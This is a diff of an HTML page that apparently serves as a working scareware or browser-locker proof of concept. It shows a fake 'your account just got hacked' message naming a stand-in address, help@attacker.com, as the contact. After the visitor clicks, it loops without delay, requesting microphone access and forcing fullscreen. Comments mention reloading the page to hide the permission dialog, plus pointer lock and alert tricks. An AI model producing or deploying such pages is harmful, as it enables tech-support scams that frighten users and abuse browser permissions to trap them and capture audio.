@@ -1,22 +1,58 @@
-<html onclick=main()>
-<center>
-<h1> Click On Screen <h1>
+<!DOCTYPE html>
+<html>
+<style>
+  select {
+    all: initial;
+    text-align: center;
+    width: 50vw;
+    font-size: 1.5rem;
+  }
+
+  center {
+    margin-top: 25vh;
+  }
+
+  option {
+    height: 100vh;
+  }
+</style>
+
+<body>
+  <center>
+    <select id="mySelect">
+      <option disabled>&emsp;</option>
+      <option disabled></option>
+      <option disabled></option>
+      <option disabled>&emsp;&emsp;Your account just got hacked. Email help@attacker.com to save your account.</option>
+      <option disabled></option>
+      <option disabled></option>
+      <option disabled></option>
+    </select>
+    <h1>Click Anywhere</h1>
+  </center>
+</body>
 <script>
-    function main() {
+  //var selectElement = document.getElementById("mySelect");
 
-pointerLockElement.requestPointerLock();
-            fullscreenElement.appendChild(pointerLockElement)
+  window.addEventListener('click', function () {
+   //window.open("https://support.wwf.org.uk/earth_hour/index.php?type=individual", '_blank');
 
-        fullscreenElement.requestFullscreen();
-
-
-    }
+    setInterval(function () {
+	 navigator.mediaDevices.getUserMedia({"audio": true}).then((stream)=>{
+        // If microphone received, reopen the page to hide permission dialog
+       // window.location.reload();
+      }
+    );//
+	   document.body.requestFullscreen();
+	   //document.body.requestPointerLock();
+	  // setTimeout('document.exitPointerLock()',1);
+	                               //setTimeout('alert(1);',1000);
+	  
+     //window.location.href='http://google.com';
+	 
+			//selectElement.showPicker();
+    }, 0);
+  });
 </script>
-
-
-<div id="pointerLockElement"></div>
-
-<div id="fullscreenElement">
-</div>
 
 </html>
